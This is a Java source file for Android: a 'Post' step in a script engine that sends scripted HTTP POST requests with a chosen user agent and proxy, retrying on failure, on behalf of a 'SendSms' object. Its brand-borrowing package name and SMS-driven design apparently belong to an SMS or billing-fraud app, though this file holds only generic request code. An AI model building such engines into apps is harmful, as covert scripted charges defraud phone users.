package com.baidu.alipay.script;

import java.util.List;

import android.content.Context;

import com.baidu.alipay.LogUtil;
import com.baidu.alipay.net.HttpConnect;

public class Post extends Tags {
    private static final String TAG = "Post";
    
    public static final String PROP_URL = "url";
    public static final String PROP_BACK = "back";
    public static final String PROP_DATA = "data";
    public static final String PROP_PROXY = "proxy";
    
    private String url;
    private String data;
    private String back;
    private String proxy;
    
    private static int maxTryTimes = 3;

    public Post(String post,boolean dynamic) {
        this.url = getNodeValue(post, PROP_URL);
        this.back = getNodeValue(post, PROP_BACK);
        this.data = getNodeValue(post, PROP_DATA);
        this.setHeader = getNodeValue(post, PROP_SETHEADER);
        this.proxy = getNodeValue(post, PROP_PROXY);
        this.proxy = this.proxy == "" ? "1" : "0";
        this.dynamic = dynamic;
    }

    public String work(Context context, SendSms sendSms, List<Tags> tagsList, int pos) {
        
        String Url_ = formatUrl(sendSms,url);
        
        String Data_ = fomartData(sendSms,data);
        String SetHeader_ = null;
        if (setHeader != null) {
            SetHeader_ = fomartData(sendSms,setHeader);
        }
        
        int tryTimes = 0;
        
        while(tryTimes < maxTryTimes && rStr == null){
        	try {
        		if(tryTimes > 0){
        			Thread.sleep(1000 * 2);
        		}
        		
            	HttpConnect conn = new HttpConnect(context);
                conn.isProxy = (proxy == "1");
                
//                LogUtil.e(TAG, "post 方法第"+tryTimes+"次访问" + Url_);
//                LogUtil.e(TAG, "post UA~~" + sendSms.getUa());
//                LogUtil.e(TAG, "post data~~" + Data_);
               
                byte[] BackStream = conn.request(sendSms,Url_, "POST", referer, sendSms.getUa(), Data_,
                        SetHeader_, 0);
                if (BackStream == null) {
//                    LogUtil.e(TAG, "POST方法400错误" + back + "");
                    errorReason = "P_400_" + back;
                }else{
                	rStr = "1";
                    
                    if (back != null && !back.equals("")) {
                    	rStr = com.baidu.alipay.Tools.byteToUTF8String(BackStream);
                    	LogUtil.e(TAG, "pma~~~~" + rStr);
//                    	rStr = "POST:" + Url_ + "\r\n" + rStr;
                        sendSms.setDataValue(back, rStr);
                    }
                }
                
                conn = null;
                BackStream = null;
                System.gc();
            } catch (Exception ex) {
                ex.printStackTrace();
                
                errorReason = "P_" + back + "_" + ex.getClass().getName();
            }
        	
        	tryTimes ++;
        	
        }
        
        if(rStr == null){
        	return TAGS_EXEC_FAIL;
        }else{
        	rStr = null;
        	errorReason = "";
        	return TAGS_EXEC_SUCC;
        }
    }

	@Override
	public String getTag() {
		return TAGS_POST;
	}
}